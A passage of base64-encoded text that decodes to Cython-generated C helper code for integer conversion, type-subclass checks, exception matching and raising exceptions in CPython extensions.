QWUxPTkdfSU5URVJOQUxTXG4gICAgICAgIGlmIChfX1B5eF9QeUxvbmdfSXNDb21wYWN0KHgpKSB7XG4gICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChpbnQsIF9fUHl4X2NvbXBhY3RfcHlsb25nLCBfX1B5eF9QeUxvbmdfQ29tcGFjdFZhbHVlKHgpKVxuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgY29uc3QgZGlnaXQqIGRpZ2l0cyA9IF9fUHl4X1B5TG9uZ19EaWdpdHMoeCk7XG4gICAgICAgICAgICBhc3NlcnQoX19QeXhfUHlMb25nX0RpZ2l0Q291bnQoeCkgPiAxKTtcbiAgICAgICAgICAgIHN3aXRjaCAoX19QeXhfUHlMb25nX1NpZ25lZERpZ2l0Q291bnQoeCkpIHtcbiAgICAgICAgICAgICAgICBjYXNlIC0yOlxuICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YoaW50KSAtIDEgPiAxICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gMiAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChpbnQsIGxvbmcsIC0obG9uZykgKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKVxuICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihpbnQpIC0gMSA+IDIgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChpbnQpICgoKGludCktMSkqKCgoKChpbnQpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMF0pKSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgY2FzZSAyOlxuICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YoaW50KSA+IDEgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAyICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGludCwgdW5zaWduZWQgbG9uZywgKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKVxuICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihpbnQpIC0gMSA+IDIgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChpbnQpICgoKCgoKGludClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1swXSkpKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICBjYXNlIC0zOlxuICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YoaW50KSAtIDEgPiAyICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gMyAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChpbnQsIGxvbmcsIC0obG9uZykgKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGludCkgLSAxID4gMyAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGludCkgKCgoaW50KS0xKSooKCgoKCgoaW50KWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMF0pKSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgY2FzZSAzOlxuICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YoaW50KSA+IDIgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAzICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGludCwgdW5zaWduZWQgbG9uZywgKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGludCkgLSAxID4gMyAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGludCkgKCgoKCgoKChpbnQpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1swXSkpKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICBjYXNlIC00OlxuICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YoaW50KSAtIDEgPiAzICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gNCAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChpbnQsIGxvbmcsIC0obG9uZykgKCgoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSlcbiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YoaW50KSAtIDEgPiA0ICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAoaW50KSAoKChpbnQpLTEpKigoKCgoKCgoKGludClkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMF0pKSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgY2FzZSA0OlxuICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YoaW50KSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiA0ICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGludCwgdW5zaWduZWQgbG9uZywgKCgoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSlcbiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YoaW50KSAtIDEgPiA0ICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAoaW50KSAoKCgoKCgoKCgoaW50KWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1swXSkpKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgIH1cbiAgICAgICAgfVxuI2VuZGlmXG4gICAgICAgIGlmICgoc2l6ZW9mKGludCkgPD0gc2l6ZW9mKGxvbmcpKSkge1xuICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlRfRVhDKGludCwgbG9uZywgUHlMb25nX0FzTG9uZyh4KSlcbiNpZmRlZiBIQVZFX0xPTkdfTE9OR1xuICAgICAgICB9IGVsc2UgaWYgKChzaXplb2YoaW50KSA8PSBzaXplb2YoUFlfTE9OR19MT05HKSkpIHtcbiAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UX0VYQyhpbnQsIFBZX0xPTkdfTE9ORywgUHlMb25nX0FzTG9uZ0xvbmcoeCkpXG4jZW5kaWZcbiAgICAgICAgfVxuICAgIH1cbiAgICB7XG4gICAgICAgIGludCB2YWw7XG4gICAgICAgIGludCByZXQgPSAtMTtcbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMEE2ICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgICAgIFB5X3NzaXplX3QgYnl0ZXNfY29waWVkID0gUHlMb25nX0FzTmF0aXZlQnl0ZXMoXG4gICAgICAgICAgICB4LCAmdmFsLCBzaXplb2YodmFsKSwgUHlfQVNOQVRJVkVCWVRFU19OQVRJVkVfRU5ESUFOIHwgKGlzX3Vuc2lnbmVkID8gUHlfQVNOQVRJVkVCWVRFU19VTlNJR05FRF9CVUZGRVIgfCBQeV9BU05BVElWRUJZVEVTX1JFSkVDVF9ORUdBVElWRSA6IDApKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KGJ5dGVzX2NvcGllZCA9PSAtMSkpIHtcbiAgICAgICAgfSBlbHNlIGlmICh1bmxpa2VseShieXRlc19jb3BpZWQgPiAoUHlfc3NpemVfdCkgc2l6ZW9mKHZhbCkpKSB7XG4gICAgICAgICAgICBnb3RvIHJhaXNlX292ZXJmbG93O1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgcmV0ID0gMDtcbiAgICAgICAgfVxuI2VsaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMGQwMDAwICYmICEoQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkpIHx8IGRlZmluZWQoX1B5TG9uZ19Bc0J5dGVBcnJheSlcbiAgICAgICAgaW50IG9uZSA9IDE7IGludCBpc19saXR0bGUgPSAoaW50KSoodW5zaWduZWQgY2hhciAqKSZvbmU7XG4gICAgICAgIHVuc2lnbmVkIGNoYXIgKmJ5dGVzID0gKHVuc2lnbmVkIGNoYXIgKikmdmFsO1xuICAgICAgICByZXQgPSBfUHlMb25nX0FzQnl0ZUFycmF5KChQeUxvbmdPYmplY3QgKil4LFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnl0ZXMsIHNpemVvZih2YWwpLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaXNfbGl0dGxlLCAhaXNfdW5zaWduZWQpO1xuI2Vsc2VcbiAgICAgICAgUHlPYmplY3QgKnY7XG4gICAgICAgIFB5T2JqZWN0ICpzdGVwdmFsID0gTlVMTCwgKm1hc2sgPSBOVUxMLCAqc2hpZnQgPSBOVUxMO1xuICAgICAgICBpbnQgYml0cywgcmVtYWluaW5nX2JpdHMsIGlzX25lZ2F0aXZlID0gMDtcbiAgICAgICAgaW50IGNodW5rX3NpemUgPSAoc2l6ZW9mKGxvbmcpIDwgOCkgPyAzMCA6IDYyO1xuICAgICAgICBpZiAobGlrZWx5KFB5TG9uZ19DaGVja0V4YWN0KHgpKSkge1xuICAgICAgICAgICAgdiA9IF9fUHl4X05ld1JlZih4KTtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIHYgPSBQeU51bWJlcl9Mb25nKHgpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCF2KSkgcmV0dXJuIChpbnQpIC0xO1xuICAgICAgICAgICAgYXNzZXJ0KFB5TG9uZ19DaGVja0V4YWN0KHYpKTtcbiAgICAgICAgfVxuICAgICAgICB7XG4gICAgICAgICAgICBpbnQgcmVzdWx0ID0gUHlPYmplY3RfUmljaENvbXBhcmVCb29sKHYsIFB5X0ZhbHNlLCBQeV9MVCk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkocmVzdWx0IDwgMCkpIHtcbiAgICAgICAgICAgICAgICBQeV9ERUNSRUYodik7XG4gICAgICAgICAgICAgICAgcmV0dXJuIChpbnQpIC0xO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgaXNfbmVnYXRpdmUgPSByZXN1bHQgPT0gMTtcbiAgICAgICAgfVxuICAgICAgICBpZiAoaXNfdW5zaWduZWQgJiYgdW5saWtlbHkoaXNfbmVnYXRpdmUpKSB7XG4gICAgICAgICAgICBQeV9ERUNSRUYodik7XG4gICAgICAgICAgICBnb3RvIHJhaXNlX25lZ19vdmVyZmxvdztcbiAgICAgICAgfSBlbHNlIGlmIChpc19uZWdhdGl2ZSkge1xuICAgICAgICAgICAgc3RlcHZhbCA9IFB5TnVtYmVyX0ludmVydCh2KTtcbiAgICAgICAgICAgIFB5X0RFQ1JFRih2KTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghc3RlcHZhbCkpXG4gICAgICAgICAgICAgICAgcmV0dXJuIChpbnQpIC0xO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgc3RlcHZhbCA9IHY7XG4gICAgICAgIH1cbiAgICAgICAgdiA9IE5VTEw7XG4gICAgICAgIHZhbCA9IChpbnQpIDA7XG4gICAgICAgIG1hc2sgPSBQeUxvbmdfRnJvbUxvbmcoKDFMIDw8IGNodW5rX3NpemUpIC0gMSk7IGlmICh1bmxpa2VseSghbWFzaykpIGdvdG8gZG9uZTtcbiAgICAgICAgc2hpZnQgPSBQeUxvbmdfRnJvbUxvbmcoY2h1bmtfc2l6ZSk7IGlmICh1bmxpa2VseSghc2hpZnQpKSBnb3RvIGRvbmU7XG4gICAgICAgIGZvciAoYml0cyA9IDA7IGJpdHMgPCAoaW50KSBzaXplb2YoaW50KSAqIDggLSBjaHVua19zaXplOyBiaXRzICs9IGNodW5rX3NpemUpIHtcbiAgICAgICAgICAgIFB5T2JqZWN0ICp0bXAsICpkaWdpdDtcbiAgICAgICAgICAgIGxvbmcgaWRpZ2l0O1xuICAgICAgICAgICAgZGlnaXQgPSBQeU51bWJlcl9BbmQoc3RlcHZhbCwgbWFzayk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIWRpZ2l0KSkgZ290byBkb25lO1xuICAgICAgICAgICAgaWRpZ2l0ID0gUHlMb25nX0FzTG9uZyhkaWdpdCk7XG4gICAgICAgICAgICBQeV9ERUNSRUYoZGlnaXQpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KGlkaWdpdCA8IDApKSBnb3RvIGRvbmU7XG4gICAgICAgICAgICB2YWwgfD0gKChpbnQpIGlkaWdpdCkgPDwgYml0cztcbiAgICAgICAgICAgIHRtcCA9IFB5TnVtYmVyX1JzaGlmdChzdGVwdmFsLCBzaGlmdCk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIXRtcCkpIGdvdG8gZG9uZTtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihzdGVwdmFsKTsgc3RlcHZhbCA9IHRtcDtcbiAgICAgICAgfVxuICAgICAgICBQeV9ERUNSRUYoc2hpZnQpOyBzaGlmdCA9IE5VTEw7XG4gICAgICAgIFB5X0RFQ1JFRihtYXNrKTsgbWFzayA9IE5VTEw7XG4gICAgICAgIHtcbiAgICAgICAgICAgIGxvbmcgaWRpZ2l0ID0gUHlMb25nX0FzTG9uZyhzdGVwdmFsKTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShpZGlnaXQgPCAwKSkgZ290byBkb25lO1xuICAgICAgICAgICAgcmVtYWluaW5nX2JpdHMgPSAoKGludCkgc2l6ZW9mKGludCkgKiA4KSAtIGJpdHMgLSAoaXNfdW5zaWduZWQgPyAwIDogMSk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoaWRpZ2l0ID49ICgxTCA8PCByZW1haW5pbmdfYml0cykpKVxuICAgICAgICAgICAgICAgIGdvdG8gcmFpc2Vfb3ZlcmZsb3c7XG4gICAgICAgICAgICB2YWwgfD0gKChpbnQpIGlkaWdpdCkgPDwgYml0cztcbiAgICAgICAgfVxuICAgICAgICBpZiAoIWlzX3Vuc2lnbmVkKSB7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkodmFsICYgKCgoaW50KSAxKSA8PCAoc2l6ZW9mKGludCkgKiA4IC0gMSkpKSlcbiAgICAgICAgICAgICAgICBnb3RvIHJhaXNlX292ZXJmbG93O1xuICAgICAgICAgICAgaWYgKGlzX25lZ2F0aXZlKVxuICAgICAgICAgICAgICAgIHZhbCA9IH52YWw7XG4gICAgICAgIH1cbiAgICAgICAgcmV0ID0gMDtcbiAgICBkb25lOlxuICAgICAgICBQeV9YREVDUkVGKHNoaWZ0KTtcbiAgICAgICAgUHlfWERFQ1JFRihtYXNrKTtcbiAgICAgICAgUHlfWERFQ1JFRihzdGVwdmFsKTtcbiNlbmRpZlxuICAgICAgICBpZiAodW5saWtlbHkocmV0KSlcbiAgICAgICAgICAgIHJldHVybiAoaW50KSAtMTtcbiAgICAgICAgcmV0dXJuIHZhbDtcbiAgICB9XG5yYWlzZV9vdmVyZmxvdzpcbiAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfT3ZlcmZsb3dFcnJvcixcbiAgICAgICAgInZhbHVlIHRvbyBsYXJnZSB0byBjb252ZXJ0IHRvIGludCIpO1xuICAgIHJldHVybiAoaW50KSAtMTtcbnJhaXNlX25lZ19vdmVyZmxvdzpcbiAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfT3ZlcmZsb3dFcnJvcixcbiAgICAgICAgImNhblwndCBjb252ZXJ0IG5lZ2F0aXZlIHZhbHVlIHRvIGludCIpO1xuICAgIHJldHVybiAoaW50KSAtMTtcbn1cblxuXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG5zdGF0aWMgaW50IF9fUHl4X0luQmFzZXMoUHlUeXBlT2JqZWN0ICphLCBQeVR5cGVPYmplY3QgKmIpIHtcbiAgICB3aGlsZSAoYSkge1xuICAgICAgICBhID0gX19QeXhfUHlUeXBlX0dldFNsb3QoYSwgdHBfYmFzZSwgUHlUeXBlT2JqZWN0Kik7XG4gICAgICAgIGlmIChhID09IGIpXG4gICAgICAgICAgICByZXR1cm4gMTtcbiAgICB9XG4gICAgcmV0dXJuIGIgPT0gJlB5QmFzZU9iamVjdF9UeXBlO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X0lzU3VidHlwZShQeVR5cGVPYmplY3QgKmEsIFB5VHlwZU9iamVjdCAqYikge1xuICAgIFB5T2JqZWN0ICptcm87XG4gICAgaWYgKGEgPT0gYikgcmV0dXJuIDE7XG4gICAgbXJvID0gYS0+dHBfbXJvO1xuICAgIGlmIChsaWtlbHkobXJvKSkge1xuICAgICAgICBQeV9zc2l6ZV90IGksIG47XG4gICAgICAgIG4gPSBQeVR1cGxlX0dFVF9TSVpFKG1ybyk7XG4gICAgICAgIGZvciAoaSA9IDA7IGkgPCBuOyBpKyspIHtcbiAgICAgICAgICAgIGlmIChQeVR1cGxlX0dFVF9JVEVNKG1ybywgaSkgPT0gKFB5T2JqZWN0ICopYilcbiAgICAgICAgICAgICAgICByZXR1cm4gMTtcbiAgICAgICAgfVxuICAgICAgICByZXR1cm4gMDtcbiAgICB9XG4gICAgcmV0dXJuIF9fUHl4X0luQmFzZXMoYSwgYik7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfSXNBbnlTdWJ0eXBlMihQeVR5cGVPYmplY3QgKmNscywgUHlUeXBlT2JqZWN0ICphLCBQeVR5cGVPYmplY3QgKmIpIHtcbiAgICBQeU9iamVjdCAqbXJvO1xuICAgIGlmIChjbHMgPT0gYSB8fCBjbHMgPT0gYikgcmV0dXJuIDE7XG4gICAgbXJvID0gY2xzLT50cF9tcm87XG4gICAgaWYgKGxpa2VseShtcm8pKSB7XG4gICAgICAgIFB5X3NzaXplX3QgaSwgbjtcbiAgICAgICAgbiA9IFB5VHVwbGVfR0VUX1NJWkUobXJvKTtcbiAgICAgICAgZm9yIChpID0gMDsgaSA8IG47IGkrKykge1xuICAgICAgICAgICAgUHlPYmplY3QgKmJhc2UgPSBQeVR1cGxlX0dFVF9JVEVNKG1ybywgaSk7XG4gICAgICAgICAgICBpZiAoYmFzZSA9PSAoUHlPYmplY3QgKilhIHx8IGJhc2UgPT0gKFB5T2JqZWN0ICopYilcbiAgICAgICAgICAgICAgICByZXR1cm4gMTtcbiAgICAgICAgfVxuICAgICAgICByZXR1cm4gMDtcbiAgICB9XG4gICAgcmV0dXJuIF9fUHl4X0luQmFzZXMoY2xzLCBhKSB8fCBfX1B5eF9JbkJhc2VzKGNscywgYik7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfaW5uZXJfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzMihQeU9iamVjdCAqZXJyLCBQeU9iamVjdCogZXhjX3R5cGUxLCBQeU9iamVjdCAqZXhjX3R5cGUyKSB7XG4gICAgaWYgKGV4Y190eXBlMSkge1xuICAgICAgICByZXR1cm4gX19QeXhfSXNBbnlTdWJ0eXBlMigoUHlUeXBlT2JqZWN0KillcnIsIChQeVR5cGVPYmplY3QqKWV4Y190eXBlMSwgKFB5VHlwZU9iamVjdCopZXhjX3R5cGUyKTtcbiAgICB9IGVsc2Uge1xuICAgICAgICByZXR1cm4gX19QeXhfSXNTdWJ0eXBlKChQeVR5cGVPYmplY3QqKWVyciwgKFB5VHlwZU9iamVjdCopZXhjX3R5cGUyKTtcbiAgICB9XG59XG5zdGF0aWMgaW50IF9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlc1R1cGxlKFB5T2JqZWN0ICpleGNfdHlwZSwgUHlPYmplY3QgKnR1cGxlKSB7XG4gICAgUHlfc3NpemVfdCBpLCBuO1xuICAgIGFzc2VydChQeUV4Y2VwdGlvbkNsYXNzX0NoZWNrKGV4Y190eXBlKSk7XG4gICAgbiA9IFB5VHVwbGVfR0VUX1NJWkUodHVwbGUpO1xuICAgIGZvciAoaT0wOyBpPG47IGkrKykge1xuICAgICAgICBpZiAoZXhjX3R5cGUgPT0gUHlUdXBsZV9HRVRfSVRFTSh0dXBsZSwgaSkpIHJldHVybiAxO1xuICAgIH1cbiAgICBmb3IgKGk9MDsgaTxuOyBpKyspIHtcbiAgICAgICAgUHlPYmplY3QgKnQgPSBQeVR1cGxlX0dFVF9JVEVNKHR1cGxlLCBpKTtcbiAgICAgICAgaWYgKGxpa2VseShQeUV4Y2VwdGlvbkNsYXNzX0NoZWNrKHQpKSkge1xuICAgICAgICAgICAgaWYgKF9fUHl4X2lubmVyX1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlczIoZXhjX3R5cGUsIE5VTEwsIHQpKSByZXR1cm4gMTtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgfVxuICAgIH1cbiAgICByZXR1cm4gMDtcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoUHlPYmplY3QgKmVyciwgUHlPYmplY3QqIGV4Y190eXBlKSB7XG4gICAgaWYgKGxpa2VseShlcnIgPT0gZXhjX3R5cGUpKSByZXR1cm4gMTtcbiAgICBpZiAobGlrZWx5KFB5RXhjZXB0aW9uQ2xhc3NfQ2hlY2soZXJyKSkpIHtcbiAgICAgICAgaWYgKGxpa2VseShQeUV4Y2VwdGlvbkNsYXNzX0NoZWNrKGV4Y190eXBlKSkpIHtcbiAgICAgICAgICAgIHJldHVybiBfX1B5eF9pbm5lcl9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMyKGVyciwgTlVMTCwgZXhjX3R5cGUpO1xuICAgICAgICB9IGVsc2UgaWYgKGxpa2VseShQeVR1cGxlX0NoZWNrKGV4Y190eXBlKSkpIHtcbiAgICAgICAgICAgIHJldHVybiBfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXNUdXBsZShlcnIsIGV4Y190eXBlKTtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgfVxuICAgIH1cbiAgICByZXR1cm4gUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGVyciwgZXhjX3R5cGUpO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlczIoUHlPYmplY3QgKmVyciwgUHlPYmplY3QgKmV4Y190eXBlMSwgUHlPYmplY3QgKmV4Y190eXBlMikge1xuICAgIGFzc2VydChQeUV4Y2VwdGlvbkNsYXNzX0NoZWNrKGV4Y190eXBlMSkpO1xuICAgIGFzc2VydChQeUV4Y2VwdGlvbkNsYXNzX0NoZWNrKGV4Y190eXBlMikpO1xuICAgIGlmIChsaWtlbHkoZXJyID09IGV4Y190eXBlMSB8fCBlcnIgPT0gZXhjX3R5cGUyKSkgcmV0dXJuIDE7XG4gICAgaWYgKGxpa2VseShQeUV4Y2VwdGlvbkNsYXNzX0NoZWNrKGVycikpKSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9pbm5lcl9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMyKGVyciwgZXhjX3R5cGUxLCBleGNfdHlwZTIpO1xuICAgIH1cbiAgICByZXR1cm4gKFB5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhlcnIsIGV4Y190eXBlMSkgfHwgUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGVyciwgZXhjX3R5cGUyKSk7XG59XG4jZW5kaWZcblxuXG5zdGF0aWMgdm9pZCBfX1B5eF9SYWlzZShQeU9iamVjdCAqdHlwZSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqdGIsIFB5T2JqZWN0ICpjYXVzZSkge1xuICAgIFB5T2JqZWN0KiBvd25lZF9pbnN0YW5jZSA9IE5VTEw7XG4gICAgaWYgKHRiID09IFB5X05vbmUpIHtcbiAgICAgICAgdGIgPSAwO1xuICAgIH0gZWxzZSBpZiAodGIgJiYgIVB5VHJhY2VCYWNrX0NoZWNrKHRiKSkge1xuICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgInJhaXNlOiBhcmcgMyBtdXN0IGJlIGEgdHJhY2ViYWNrIG9yIE5vbmUiKTtcbiAgICAgICAgZ290byBiYWQ7XG4gICAgfVxuICAgIGlmICh2YWx1ZSA9PSBQeV9Ob25lKVxuICAgICAgICB2YWx1ZSA9IDA7XG4gICAgaWYgKFB5RXhjZXB0aW9uSW5zdGFuY2VfQ2hlY2sodHlwZSkpIHtcbiAgICAgICAgaWYgKHZhbHVlKSB7XG4gICAgICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgICAgICJpbnN0